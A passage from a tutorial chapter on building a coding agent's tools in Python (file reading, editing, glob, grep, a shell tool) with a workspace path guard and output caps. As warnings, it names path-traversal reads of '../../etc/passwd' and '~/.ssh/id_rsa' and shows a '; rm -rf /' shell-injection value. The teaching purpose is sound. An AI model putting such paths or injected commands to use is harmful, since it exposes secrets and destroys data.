[← Phase 3: Conversation State & Streaming](./03-conversation-and-streaming.md) · [Guide index](./README.md) · [Phase 5: Permissions, Safety & the Hook System →](./05-permissions-and-safety.md)

# Phase 4 — Real-World Tools (the Claude-Code Toolset)

> **Series context:** Phases 0–3 built the agent loop, the tool registry with the
> `@tool` decorator and `ToolRegistry` class, and streaming. This phase fills the registry
> with the tools that make a coding agent actually useful: filesystem reads and writes,
> surgical edits, shell execution, glob, grep, and directory listing. Every tool is pure
> Python stdlib. No frameworks, no third-party packages beyond `openai`.

---

> ## 🟢 Beginner track: good news — this phase is mostly plain functions
>
> Each tool below (`read_file`, `write_file`, `bash`, `grep`, …) is **an ordinary
> function** built from things you know: `if`/`else`, `for`, lists, dicts, string
> operators, and `return`. You can read every tool body directly. A few heads-ups so
> nothing trips you up:
>
> - **`@tool` above each function** is the decorator from
>   [Phase 2](./02-tool-system.md#-beginner-track).
>   It only auto-writes the schema dict. You can delete the `@tool` lines and register
>   each function the simple way — `register("read_file", read_file, read_file_schema)`
>   with a hand-written schema dict — exactly as in the Phase 2 beginner box. The
>   function bodies don't change at all.
> - **`pathlib.Path`** is the standard way to handle file paths. `p = Path("src/a.py")`
>   makes a path *object*; then `p.exists()`, `p.read_text()`, `p.is_file()` are
>   methods that ask/do things with it. Read `p.read_text()` as "read this file's text."
>   It's an object with handy functions attached — nothing more.
> - **`key=lambda e: e.name.lower()`** (in the `sorted(...)` calls). A `lambda` is just
>   a one-line function with no name. `lambda e: e.name.lower()` is the same as defining
>   `def f(e): return e.name.lower()` and passing `f`. Here it tells `sorted` to order
>   entries by their lowercased name.
> - **Fancy f-strings** like `f"{n:.0f}"` or `f"{e.name:<40s}"` just control formatting
>   (decimal places, column width). The `{...}` still means "drop a value in here"; the
>   part after `:` is cosmetic. You can ignore the details. One twist appears later in
>   `read_file`: the width can itself be a variable — `f"{x:{width}d}"` fills in
>   `width` first, then right-aligns the integer `x` in that many columns.
> - **`try:` / `except:`** appears throughout — see the
>   [Phase 1 box](./01-bare-harness.md) if you need the refresher: "try this; if it
>   errors, return an error string instead of crashing."
>
> With those five notes, the entire phase is readable with your five concepts.

---

## The shape of this phase: three versions of one harness

Like every phase in this guide, Phase 4 is a **ladder of complete, runnable versions of
the same harness** — not one big program revealed all at once. Each version does the
same job; only the organization changes:

- **Version 1 — line-by-line.** The harness with **one** real tool (`read_file`) whose
  logic sits *inline* in the dispatch branch. No `def`, no classes — just statements
  top to bottom. You will watch the model touch your actual disk before any safety
  machinery exists.
- **Version 2 — functions.** The same harness with each tool as a **plain function**
  (`read_file`, `list_dir`, `glob`, `grep`, `write_file`, `edit_file`, `bash`), plus two
  plain helper functions (`_safe_path`, `_truncate`) that keep the agent confined to its
  workspace and its output bounded. Tools are introduced one at a time, safest first.
- **Version 3 — the organized toolset.** The same tools, grouped into one module with
  the workspace confinement enforced centrally and the Phase 2 `@tool` / `ToolRegistry`
  machinery doing the bookkeeping — the shape the consolidated package
  (`code/agent_harness/tools/files.py` and `shell.py`) uses.

Between versions you will find a short *"what changed"* list, so you always know you are
looking at a reorganization of a program you already ran — never a brand-new one.

**Contents:**

> **Prefer running this phase as a notebook?** [`notebooks/04-real-tools.ipynb`](./notebooks/04-real-tools.ipynb) executes this phase's runnable core offline — see [notebooks/README.md](./notebooks/README.md).

- [Why tools define the agent's power](#why-tools-define-the-agents-power)
- [Version 1 — line-by-line: the agent touches your disk](#version-1--line-by-line-the-agent-touches-your-disk-no-def-no-classes)
- [Version 2 — functions: the toolset grows, one tool at a time](#version-2--functions-the-toolset-grows-one-tool-at-a-time)
- [Version 3 — the organized toolset](#version-3--the-organized-toolset-the-same-idea-organized)
- [Version 3 reference — the production tools](#version-3-reference--the-production-tools)
- [Step 3.3 — the end-to-end demo](#step-33--the-end-to-end-demo)
- [Deep dive — output-size discipline](#deep-dive--output-size-discipline)
- [Version 3 reference — the complete `coding_tools.py`](#version-3-reference--the-complete-coding_toolspy)
- [Pitfalls](#pitfalls)

---

## Why tools define the agent's power

The loop from Phase 1 is the skeleton. Tools are the muscles. A model that can only
reason about code it has seen in its context window is helpless against a real codebase.
Give it `read_file` and it can inspect any source file. Give it `edit_file` and it can
make precise surgical changes. Give it `bash` and it can run tests, install packages,
and observe the results. The combination is what makes Claude Code — and what we are
building here — feel like a capable pair-programmer rather than a sophisticated autocomplete.

### Design principles for agent tools

These principles apply to every tool in this phase and to any tool you will write in the
future. They are not suggestions; violating them reliably produces broken agents.

**(a) Clear, model-facing descriptions.**
The model decides when and how to call a tool based entirely on its `description` string
and its parameter docstrings. A vague description produces wrong or missed calls. Every
tool here has a description written as if you were explaining the function to a competent
engineer who cannot see its source code. Include: what it does, what it returns, what
parameters are optional and what their defaults mean, and what happens on error.

**(b) Return concise but sufficient output.**
The model must read the tool result and reason about it. More text is not always better;
a wall of irrelevant output crowds out useful context. Each tool returns the minimum
information needed for the model to take the next correct action.

**(c) Deterministic and idempotent where possible.**
`read_file` always returns the same bytes for the same path. `glob` returns a sorted,
stable list. `write_file` is idempotent on identical content. Non-determinism in tools
causes the model to produce non-deterministic reasoning, which is hard to debug.

**(d) Fail with actionable error strings.**
Tools never raise exceptions into the loop (Phase 2 contract). When something goes wrong
the tool returns a string starting with `"ERROR: "` that tells the model exactly what
happened and, where possible, how to recover. `"ERROR: File not found: /src/foo.py"` is
actionable. `"Something went wrong"` is not.

**(e) Guard against pathologically large output.**
A file with 500,000 lines will blow up the context window if returned verbatim. Every
tool that reads file contents or command output passes through a shared `_truncate()`
helper that caps both character count and line count. The truncation message is visible
to the model so it knows to ask for a slice.

**(f) Path safety: resolve within the workspace root.**
An agent running shell commands and writing files is a code-execution sandbox. Without
path guards, a malicious or confused model can write to `../../etc/passwd` or read
secrets outside the project. Every path-taking tool calls `_safe_path()` which resolves
the path and asserts it stays within `WORKSPACE_ROOT`.

---

## Version 1 — line-by-line: the agent touches your disk (no `def`, no classes)

Before adding all seven tools, shared helpers, and the registry factory, let's get **one
tool working end-to-end** so you can see the whole circuit light up.

We will start with `read_file` — the simplest, safest tool. It reads a file and returns
its text. No writing, no shell commands, nothing destructive.

And we will write it the most primitive way possible: **no `def`, no classes** — the
tool's logic lives *directly inside the dispatch branch* of the loop, as a bare
`try`/`except` around `open()`. This is deliberate. When you can point at the exact line
where the model's JSON arguments become a real `open()` call on your real filesystem,
the phrase *"the agent can now touch your disk"* stops being abstract.

This is the entire program — paste it into one file:

```python
# v1_inline_read.py
"""Version 1 — the harness with one real tool, line by line.

No def, no classes.  The read_file logic sits inline in the dispatch
branch, so you can see the exact moment the model touches your disk.
"""

import json
from openai import OpenAI

client = OpenAI()   # reads OPENAI_API_KEY from the environment

# Create a small test file so there is something to read.
with open("hello.txt", "w") as f:
    f.write("Hello from Phase 4!\nThis is line 2.\n")

# The schema: a plain dict telling the model a read_file tool exists.
tools = [{
    "type": "function",
    "name": "read_file",
    "description": (
        "Read a text file and return its contents. "
        "Returns an ERROR string if the file does not exist or cannot be read."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "Path to the file to read."},
        },
        "required": ["path"],
    },
}]

input_items = [{"role": "user", "content": "What is in the file hello.txt?"}]

while True:
    resp = client.responses.create(
        model="gpt-4o",
        input=input_items,
        tools=tools,
    )

    # Append every output item to the transcript.
    for item in resp.output:
        input_items.append(
            item.model_dump() if hasattr(item, "model_dump") else item
        )

    # Collect any tool calls in this turn.
    tool_calls = [item for item in resp.output
                  if getattr(item, "type", None) == "function_call"]

    if not tool_calls:
        # No tool calls → the model produced its final answer.
        for item in resp.output:
            if getattr(item, "type", None) == "message":
                for block in item.content:
                    if getattr(block, "type", None) == "output_text":
                        print("ANSWER:", block.text)
        break

    # Answer each tool call.
    for tc in tool_calls:
        args = json.loads(tc.arguments) if isinstance(tc.arguments, str) else tc.arguments
        print(f"[tool] {tc.name}({args})")

        if tc.name == "read_file":
            # ── The tool logic, inlined right here. ─────────────────────
            # This is the line where the model touches your disk.
            try:
                with open(args["path"], "r", encoding="utf-8", errors="replace") as f:
                    result = f.read()
            except FileNotFoundError:
                result = "ERROR: File not found: " + args["path"]
            except OSError as exc:
                result = "ERROR: Cannot read file: " + str(exc)
        else:
            result = "ERROR: Unknown tool: " + tc.name

        print(f"[result] {result[:120]}")

        input_items.append({
            "type": "function_call_output",
            "call_id": tc.call_id,
            "output": result,
        })
```

### ▶ Run it now

```bash
export OPENAI_API_KEY=sk-...
python v1_inline_read.py
```

You should see the model call `read_file({'path': 'hello.txt'})`, your inline
`open()` execute, and the answer come back describing the file's two lines.

> [!WARNING]
> **Let it sink in.** That `open(args["path"], ...)` call ran with a path that *the model
> chose*, on *your* machine. Nothing in this program stops it from choosing
> `"../../etc/passwd"` or `"~/.ssh/id_rsa"` — try changing the task string to
> `"What is in the file /etc/hostname?"` and watch it happily read outside your project.
> That is exactly the visceral lesson Version 1 exists to teach: **a real tool is real
> power, and right now there is zero safety machinery.** Versions 2 and 3 are largely
> about earning back control: workspace confinement, output caps, and (in Phase 5) human
> approval for the dangerous calls.

One tool, one schema dict, an inline `try`/`except` — that is the whole circuit. The
rest of this phase is the same circuit, scaled up and reorganized.

---

## Version 2 — functions: the toolset grows, one tool at a time

### What changed from V1 to V2

- The inline `try`/`except open(...)` block moves out of the dispatch branch into a
  named function, `read_file(path)` — the loop just calls `read_file(**args)`.
- A plain dict, `tool_fns = {"read_file": read_file, ...}`, replaces the
  `if tc.name == ...:` chain, so adding a tool means: write a function, write its schema
  dict, add one dict entry. The loop never changes again.
- Six more tools join, safest first: `list_dir`, `glob`, `grep` (read-only), then
  `write_file`, `edit_file` (destructive), then `bash` (arbitrary execution).
- Two shared helper functions appear — `_safe_path` (workspace confinement) and
  `_truncate` (output caps) — and every tool routes through them.
- The harness loop itself is **unchanged**: same transcript list, same
  `call_id`/`function_call_output` handshake, same exit condition.

The same harness, reorganized: each tool becomes a plain function, and a dispatch dict
maps tool names to functions. No classes, no decorators — everything here is `def`,
`if`/`else`, lists, dicts, and `return`. We build the toolset one tool per step, each
with its own run checkpoint, ordered from safest (read-only) to most dangerous (`bash`).

## Step 2.0 — `read_file` becomes a named function

In Version 1 the file-reading logic lived inside the dispatch branch. The first move of
Version 2 is to lift it out into a function with a name, so the loop reads as *what*
happens (call the tool) rather than *how* (open, read, catch errors).

No decorator, no `pathlib`, no path guard yet. Just `open()`, a `try/except`, and a
`return`. If the file exists you get its text; if not, you get an error string.

```python
# v2_read_file.py
"""Version 2, first step: read_file as a named function wired into the harness."""

import json
from openai import OpenAI

client = OpenAI()   # reads OPENAI_API_KEY from the environment

# ── 1. The tool function ──────────────────────────────────────────────────────

def read_file(path: str) -> str:
    """Read a text file and return its contents, or an error string."""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return f.read()
    except FileNotFoundError:
        return f"ERROR: File not found: {path}"
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"

# ── 2. The tool schema ────────────────────────────────────────────────────────
# This is just a dict that tells the model: "there is a function called
# read_file; here is what it does and what arguments it takes."

READ_FILE_SCHEMA = {
    "type": "function",
    "name": "read_file",
    "description": (
        "Read a text file and return its contents. "
        "Returns an ERROR string if the file does not exist or cannot be read."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "path": {
                "type": "string",
                "description": "Path to the file to read.",
            },
        },
        "required": ["path"],
    },
}

# ── 3. The harness ────────────────────────────────────────────────────────────

def run(task: str) -> None:
    """Run a one-shot agent that can call read_file."""
    input_items = [{"role": "user", "content": task}]

    while True:
        resp = client.responses.create(
            model="gpt-4o",
            input=input_items,
            tools=[READ_FILE_SCHEMA],
        )

        # Append every output item to the transcript.
        for item in resp.output:
            input_items.append(
                item.model_dump() if hasattr(item, "model_dump") else item
            )

        # Collect any tool calls in this turn.
        tool_calls = [
            item for item in resp.output
            if getattr(item, "type", None) == "function_call"
        ]

        if not tool_calls:
            # No tool calls → the model produced its final answer.
            for item in resp.output:
                if getattr(item, "type", None) == "message":
                    for block in item.content:
                        if getattr(block, "type", None) == "output_text":
                            print("ANSWER:", block.text)
            return

        # Execute each tool call and feed the result back.
        for tc in tool_calls:
            args = json.loads(tc.arguments) if isinstance(tc.arguments, str) else tc.arguments
            print(f"[tool] {tc.name}({args})")
            result = read_file(**args)   # call our plain function
            print(f"[result] {result[:120]}{'...' if len(result) > 120 else ''}\n")

            input_items.append({
                "type": "function_call_output",
                "call_id": tc.call_id,
                "output": result,
            })


if __name__ == "__main__":
    # Create a small test file so there is something to read.
    with open("hello.txt", "w") as f:
        f.write("Hello from Phase 4!\nThis is line 2.\n")

    run("What is in the file hello.txt?")
```

### ▶ Run it now

```bash
export OPENAI_API_KEY=sk-...
python v2_read_file.py
```

You should see something like:

```text
[tool] read_file({'path': 'hello.txt'})
[result] Hello from Phase 4!
This is line 2.

ANSWER: The file hello.txt contains two lines:
1. "Hello from Phase 4!"
2. "This is line 2."
```

One tool, one schema dict, a plain function — the same circuit as Version 1, but now the
tool has a name and the loop body stays short. Everything in the rest of this phase is
this same pattern, scaled up with more tools, better safety guards, and (in Version 3)
the `@tool` / `ToolRegistry` machinery from Phase 2.

---

## Step 2.1 — Add `list_dir` and `glob` (read-only, low risk)

**Why now?** `read_file` is powerful, but the agent needs to *discover* files before it
can read them. `list_dir` answers "what is in this directory?" and `glob` answers "which
files match this pattern?" Both are read-only, so they carry no risk of data loss.

Add these two functions and their schemas alongside `read_file`. Then wire them in.

### `list_dir`

```python
import pathlib

def list_dir(path: str = ".") -> str:
    """List the contents of a directory."""
    try:
        p = pathlib.Path(path)
        if not p.exists():
            return f"ERROR: Directory not found: {path}"
        if not p.is_dir():
            return f"ERROR: '{path}' is a file, not a directory."
        entries = sorted(p.iterdir(), key=lambda e: (e.is_file(), e.name.lower()))
        lines = []
        for e in entries:
            if e.is_dir():
                lines.append(f"D  {e.name}/")
            else:
                lines.append(f"F  {e.name}  ({e.stat().st_size} bytes)")
        return f"Directory: {path}\n" + "\n".join(lines)
    except OSError as exc:
        return f"ERROR: {exc}"
```

> 🟢 **The tuple sort key, decoded.** `key=lambda e: (e.is_file(), e.name.lower())`
> hands `sorted` a *pair* for each entry. Python compares tuples element by element:
> first by `e.is_file()` — and since `False < True`, directories (`is_file()` is
> `False`) sort before files — then ties are broken by the lowercased name. One line,
> two sort criteria.

### `glob`

```python
def glob(pattern: str, path: str = ".") -> str:
    """Find files matching a glob pattern."""
    try:
        base = pathlib.Path(path)
        if not base.is_dir():
            return f"ERROR: Directory not found: {path}"
        # Path.glob understands '**' natively (it means "this directory and
        # everything below it"), so '**/*.py' just works — no special casing.
        matches = list(base.glob(pattern))
        files = sorted([str(m) for m in matches if m.is_file()])
        if not files:
            return f"No files match '{pattern}' under '{path}'."
        return "\n".join(files)
    except (OSError, ValueError) as exc:
        return f"ERROR: {exc}"
```

Both functions need a schema dict, just like `READ_FILE_SCHEMA` — and both introduce
something new: an **optional parameter**. The rule is simple: a parameter with a default
value (`path: str = "."`) still goes in `"properties"` (so the model knows it exists and
what it means), but is **left out of `"required"`**. If every parameter is optional,
`"required"` is just the empty list `[]`. Describe the default in the description text so
the model knows what happens when it omits the argument.

```python
LIST_DIR_SCHEMA = {
    "type": "function",
    "name": "list_dir",
    "description": "List the files and directories at a path, one entry per line.",
    "parameters": {
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "Directory to list. Default '.'."},
        },
        "required": [],          # path is optional — it has a default
    },
}

GLOB_SCHEMA = {
    "type": "function",
    "name": "glob",
    "description": (
        "Find files matching a glob pattern, e.g. '*.py' or '**/*.py' "
        "(use '**' for recursive matching). Returns matching paths, one per line."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "pattern": {"type": "string", "description": "Glob pattern to match."},
            "path": {"type": "string", "description": "Directory to search. Default '.'."},
        },
        "required": ["pattern"],   # pattern is mandatory; path is optional
    },
}
```

Wire both into the harness by adding `LIST_DIR_SCHEMA` and `GLOB_SCHEMA` to the
`tools=[...]` list and dispatching them in the same `for tc in tool_calls:` loop:

```python
# Inside the tool-call loop, replace the single read_file call with:
tool_fns = {
    "read_file": read_file,
    "list_dir": list_dir,
    "glob": glob,
}
result = tool_fns[tc.name](**args)
```

### ▶ Run it now

Change the task string to:

```python
run("List the files in the current directory, then read hello.txt.")
```

You should see the model call `list_dir(".")` first, then `read_file("hello.txt")`.

---

## Step 2.2 — Add `grep` (still read-only, slightly more complex)

**Why now?** Once the agent can list and glob files, the natural next step is to search
*inside* them. `grep` replaces dozens of `read_file` calls with one targeted search.
It is still read-only — no risk of data loss.

```python
import re

def grep(pattern: str, path: str = ".", glob_filter: str | None = None) -> str:
    """Search file contents for a regular expression."""
    try:
        compiled = re.compile(pattern)
    except re.error as exc:
        return f"ERROR: Invalid regex: {exc}"

    base = pathlib.Path(path)
    if not base.exists():
        return f"ERROR: Path not found: {path}"

    files_to_search = [base] if base.is_file() else sorted(
        [f for f in base.rglob("*") if f.is_file()], key=str
    )
    if glob_filter:
        import fnmatch
        files_to_search = [f for f in files_to_search if fnmatch.fnmatch(f.name, glob_filter)]

    results = []
    for filepath in files_to_search:
        try:
            text = filepath.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        for lineno, line in enumerate(text.splitlines(), 1):
            if compiled.search(line):
                results.append(f"{filepath}:{lineno}: {line[:200]}")
            if len(results) >= 200:
                break
        if len(results) >= 200:
            break

    if not results:
        return f"No matches for '{pattern}' under '{path}'."
    return "\n".join(results)
```

Its schema follows the same optional-parameter rule from Step 2.1 — two of the three
parameters have defaults, so only `pattern` is `"required"`:

```python
GREP_SCHEMA = {
    "type": "function",
    "name": "grep",
    "description": (
        "Search file contents for a Python regular expression. Returns matching "
        "lines as 'filepath:linenum: line'. Searches recursively when given a directory."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "pattern": {"type": "string", "description": "Regex to search for."},
            "path": {"type": "string", "description": "File or directory to search. Default '.'."},
            "glob_filter": {
                "type": "string",
                "description": "Only search files whose name matches this glob, e.g. '*.py'. Default: search all files.",
            },
        },
        "required": ["pattern"],
    },
}
```

Add `GREP_SCHEMA` to the `tools=[...]` list and `grep` to the dispatch dict, then:

### ▶ Run it now

```python
# Create a file with a TODO first
with open("notes.py", "w") as f:
    f.write("# TODO: finish this\nx = 1\n# TODO: add tests\n")

run("Find every TODO comment in the current directory's Python files.")
```

The model should call `grep("TODO", ".", "*.py")` and find the two matches in
`notes.py` — plus, surprise, one or two more from your harness script itself: it is a
`.py` file in the same directory, and the task string above (and the `f.write` line, if
you kept it in the same file) contain the word "TODO". Those extra hits are not a bug;
they are your first taste of the agent's tools seeing *everything* in the workspace,
including the agent's own source file.

---

## Step 2.3 — Safety First: add `_safe_path` and `_truncate` before writing anything

**Why now?** So far all our tools are read-only — if they misbehave the worst case is
the model sees garbled text. We are about to add `write_file` and `edit_file`, which can
destroy data. Before we do that, let's add two small safety helpers that every
subsequent tool will use.

### `_safe_path` — the Path Guard

```python
import os

WORKSPACE_ROOT = pathlib.Path(os.getcwd()).resolve()

def _safe_path(user_path: str) -> pathlib.Path:
    """
    Resolve *user_path* relative to WORKSPACE_ROOT and verify it does not
    escape the workspace.

    Raises ValueError with an actionable message if the resolved path would
    sit outside WORKSPACE_ROOT.  Tools catch this and return the error string.

    Uses Path.resolve() which follows symlinks and collapses '..' sequences,
    so there is no way to sneak past the guard with clever relative paths.
    """
    # Treat absolute paths as relative to the workspace root so the model
    # can write "/src/foo.py" meaning "<root>/src/foo.py".
    p = pathlib.Path(user_path)
    if p.is_absolute():
        # Strip the leading "/" and re-root under WORKSPACE_ROOT.
        # pathlib.Path("/a") / pathlib.Path("/b") == pathlib.Path("/b")
        # so we must do this explicitly.
        rel = pathlib.Path(*p.parts[1:])
        p = WORKSPACE_ROOT / rel
    else:
        p = WORKSPACE_ROOT / p

    resolved = p.resolve()

    try:
        resolved.relative_to(WORKSPACE_ROOT)
    except ValueError:
        raise ValueError(
            f"Path '{user_path}' resolves to '{resolved}' which is outside "
            f"the workspace root '{WORKSPACE_ROOT}'. "
            "Use paths relative to the workspace root."
        )
    return resolved
```

> **Why `Path.resolve()` and not string manipulation?**
> `os.path.normpath` collapses `..` in the string but does *not* follow symlinks.
> A symlink at `workspace/link -> /etc` would pass a naive string check. `Path.resolve()`
> actually walks the filesystem, so a symlink pointing outside the workspace is caught.
> The cost is an extra syscall per path; that is entirely acceptable.

### `_truncate` — the Output Size Guard

```python
_DEFAULT_MAX_CHARS = 40_000    # ~10 k tokens at 4 chars/token — generous but bounded
_DEFAULT_MAX_LINES = 2_000

def _truncate(
    text: str,
    max_chars: int = _DEFAULT_MAX_CHARS,
    max_lines: int = _DEFAULT_MAX_LINES,
    label: str = "output",
) -> str:
    """
    Truncate *text* to at most *max_lines* lines and *max_chars* characters,
    whichever limit is hit first.

    Appends a visible truncation notice so the model knows output was cut.
    """
    lines = text.splitlines(keepends=True)
    if len(lines) > max_lines:
        lines = lines[:max_lines]
        text = "".join(lines)
        text += f"\n[... {label} truncated at {max_lines} lines ...]"
    if len(text) > max_chars:
        text = text[:max_chars]
        text += f"\n[... {label} truncated at {max_chars} chars ...]"
    return text
```

**Why this exists and why it matters for context economics.**
Every character a tool returns consumes context-window tokens that the model cannot use
for reasoning. A naive `cat` of a 10 MB log file does not just slow things down — it
silently discards early conversation history once the context fills, causing the model to
forget its own plan. Phase 6 covers context compaction in depth; for now, `_truncate`
is the first and cheapest line of defence. The truncation notice is intentionally visible
to the model so it can request a slice rather than silently operating on incomplete data.

Now update `read_file`, `list_dir`, `grep`, and `glob` to call `_safe_path(path)` at the
top and `_truncate(result)` before returning. The bodies stay the same — you are just
adding two lines per function. For example, `read_file` becomes:

```python
def read_file(path: str) -> str:
    try:
        p = _safe_path(path)        # NEW: resolve and guard the path
    except ValueError as exc:
        return f"ERROR: {exc}"
    try:
        with open(p, "r", encoding="utf-8", errors="replace") as f:
            text = f.read()
    except FileNotFoundError:
        return f"ERROR: File not found: {path}"
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"
    return _truncate(text, label=f"read_file({path})")   # NEW: cap the output
```

### ▶ Check it now (no API key needed)

```python
# Should succeed
print(read_file("hello.txt"))

# Should return ERROR, not read the file
print(read_file("../../etc/passwd"))
```

---

## Step 2.4 — Add `write_file` (medium risk — destructive)

**Why now?** The agent can now explore a codebase safely. Adding write capability means
it can create new files. We add `write_file` before `edit_file` because creating files
is easier to reason about — you are not changing something that already exists.

```python
def write_file(path: str, content: str) -> str:
    """Write content to a file, creating it (and parent dirs) if needed."""
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        encoded = content.encode("utf-8")
        p.write_bytes(encoded)
    except OSError as exc:
        return f"ERROR: Cannot write file: {exc}"
    lines = content.count("\n")
    return f"Wrote {len(encoded)} bytes ({lines} lines) to '{path}'."
```

**Design note — destructiveness and Phase 5 permissions.**
`write_file` will silently destroy whatever was in the file before. This is correct
behaviour for creating new files but dangerous for existing ones. Phase 5 introduces
a **permissions layer** that intercepts write operations on files the user has not
explicitly approved, surfacing a confirmation prompt before any bytes are written.
For now, the tool is intentionally raw so we can focus on its mechanics without
conflating it with the permission system.

### ▶ Run it now

Add `write_file` to the dispatch dict, then:

```python
run("Create a file called output.txt containing the text 'Hello from the agent!'")
```

Then verify it worked:

```python
run("Read output.txt and tell me what is in it.")
```

---

## Step 2.5 — Add `edit_file` — the Surgical Edit Tool (medium risk)

**Why now?** `write_file` overwrites a file completely. For modifying existing files the
safer approach is to replace only the part that needs changing — which is exactly what
`edit_file` does.

```python
def edit_file(
    path: str,
    old_string: str,
    new_string: str,
    replace_all: bool = False,
) -> str:
    """
    Replace an exact string in a file with a new string.

    The tool reads the file, verifies that old_string appears in the content,
    and writes the file back with old_string replaced by new_string.

    Args:
        path:        Path to the file, relative to the workspace root.
        old_string:  The exact text to find and replace.  Must match the file
                     contents character-for-character, including whitespace and
                     indentation.  Include enough surrounding context (e.g. the
                     full function signature plus a few lines) to make the match
                     unique.
        new_string:  The text to substitute in place of old_string.
        replace_all: If False (default), the tool returns an error if old_string
                     appears more than once in the file — ambiguous edits are
                     rejected.  If True, all occurrences are replaced.

    Returns:
        A confirmation string, or one of:
          ERROR: File not found          — path does not exist
          ERROR: old_string not found    — no match; check whitespace/indentation
          ERROR: old_string is ambiguous — N matches found, replace_all=False
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    if not p.exists():
        return f"ERROR: File not found: {path}"
    if not p.is_file():
        return f"ERROR: Not a regular file: {path}"

    try:
        original = p.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"

    count = original.count(old_string)

    if count == 0:
        # Give the model actionable guidance.
        snippet = repr(old_string[:120]) + ("..." if len(old_string) > 120 else "")
        return (
            f"ERROR: old_string not found in '{path}'.\n"
            f"Searched for: {snippet}\n"
            "Check that whitespace and indentation exactly match the file contents. "
            "Use read_file() to inspect the exact bytes."
        )

    if count > 1 and not replace_all:
        return (
            f"ERROR: old_string is ambiguous — found {count} occurrences in '{path}'. "
            "Provide more surrounding context to make old_string unique, "
            "or pass replace_all=True to replace every occurrence."
        )

    updated = original.replace(old_string, new_string)

    try:
        p.write_text(updated, encoding="utf-8")
    except OSError as exc:
        return f"ERROR: Cannot write file: {exc}"

    replacements = count if replace_all else 1
    # splitlines() counts actual lines correctly whether or not the file
    # ends with a trailing newline (count("\n") + 1 would over-report by one).
    lines_before = len(original.splitlines())
    lines_after = len(updated.splitlines())
    delta = lines_after - lines_before
    delta_str = f"+{delta}" if delta >= 0 else str(delta)
    return (
        f"Edited '{path}': replaced {replacements} occurrence(s). "
        f"File now has {lines_after} lines ({delta_str} from before)."
    )
```

**Why exact-match string replacement beats line-number patches.**

Line-number patches (`diff` / `patch` format) seem natural — you say "replace lines
42–55 with this block". But they are fragile in an agentic context:

- The model's mental model of line numbers can drift between tool calls (an earlier
  edit shifts every subsequent line number by N).
- If two tool calls run close together and both reference the same region, one can
  silently corrupt the other's target.
- The model often miscounts lines when composing a patch over a long context.

Exact-match string replacement anchors the edit to *content*, not *position*. As long
as the old string is present and unique, the edit is correct regardless of what other
edits ran before it. The uniqueness check is load-bearing: if `old_string` matches in
two places, we do not know which one the model intended, so we reject the operation and
ask for more context. This is a conservative, correct default.

Claude Code uses this exact approach. The technique is sometimes called
**positional-free patching** or **semantic patching**.

### ▶ Run it now

```python
# Create a file to edit
with open("greeting.py", "w") as f:
    f.write('def greet(name):\n    return "Hello, " + name\n')

run('In greeting.py, change the greeting from "Hello" to "Hi".')
```

Then verify:

```python
run("Show me the current contents of greeting.py.")
```

---

## Step 2.6 — Add `bash` (high risk — arbitrary execution)

**Why now?** You have all the safe, targeted tools. `bash` is the escape hatch — it lets
the agent run any shell command, including tests, package installs, and build scripts.
We add it last because it carries the highest risk. Once you understand its power and
danger, the Phase 5 permission layer (coming next) will make sense.

```python
import subprocess

def bash(command: str, timeout: int = 120) -> str:
    """
    Run a shell command and return its output (stdout and stderr combined).

    Args:
        command: The shell command to execute.  Runs under /bin/sh so shell
                 features (pipes, redirects, &&, subshells) work normally.
        timeout: Maximum seconds to wait for the command to finish.  Default
                 120.  Commands that exceed this are killed and an error is
                 returned.

    Returns:
        A string of the form:
            Exit code: 0
            ---
            <combined stdout + stderr>

        On timeout:
            ERROR: Command timed out after N seconds: <command>

    IMPORTANT — SECURITY:
        This tool executes arbitrary shell commands with the permissions of the
        agent process.  Do not expose it to untrusted input without a permission
        layer (Phase 5).  It runs with shell=True so shell injection is possible
        if user-supplied data is interpolated into the command string.

    IMPORTANT — BLOCKING:
        Interactive commands (e.g. 'python3 -i', 'vim') will hang until the
        timeout fires because stdin is closed.  Use non-interactive invocations:
        'python3 script.py' not 'python3 -i'.

    Working directory:
        Commands run with cwd=WORKSPACE_ROOT so relative paths in the command
        work as expected within the project.
    """
    try:
        result = subprocess.run(
            command,
            shell=True,                   # We want a real shell for pipes etc.
            cwd=str(WORKSPACE_ROOT),
            stdin=subprocess.DEVNULL,     # Never block waiting for input.
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,     # Merge stderr into stdout.
            timeout=timeout,
            # Do NOT use text=True here; some commands emit binary (e.g. xxd).
            # Decode ourselves with errors='replace'.
        )
        output = result.stdout.decode("utf-8", errors="replace")
        output = _truncate(output, label=f"bash({command[:60]})")
        return f"Exit code: {result.returncode}\n---\n{output}"

    except subprocess.TimeoutExpired:
        return f"ERROR: Command timed out after {timeout} seconds: {command}"
    except OSError as exc:
        return f"ERROR: Failed to start command: {exc}"
```

**The big danger: `shell=True`.**

`subprocess.run(..., shell=True)` passes the command string to `/bin/sh -c`. This is
exactly what we want — shell pipelines, redirection, variable expansion, and compound
commands all work. But it means **every character of `command` is interpreted by the
shell**. If the model ever constructs a command by interpolating untrusted user input,
shell injection is trivially possible:

```python
# DANGEROUS if user_input comes from outside the agent:
bash(f"grep {user_input} /src/main.py")
# A user_input of '; rm -rf /' becomes a catastrophe.
```

In a coding agent the model constructs the commands, and the model is (mostly) trusted.
But Phase 5 introduces a permission system that shows the user every `bash` call before
it runs. That second pair of eyes is the real safety net — `shell=True` vs `shell=False`
is a secondary concern. Document the risk loudly; do not paper over it.

**Interactive commands and stdin.**

`stdin=subprocess.DEVNULL` closes stdin immediately. Any command that tries to read
from stdin will see EOF and exit (or error). This is correct: an interactive Python
REPL waiting for input would block until the `timeout` fires, burning 120 seconds and
returning nothing useful. The model should know to use `python3 script.py` not
`python3 -i`, and the docstring says so.

**Working directory.**

Setting `cwd=WORKSPACE_ROOT` means the model can write `bash("ls src/")` and get the
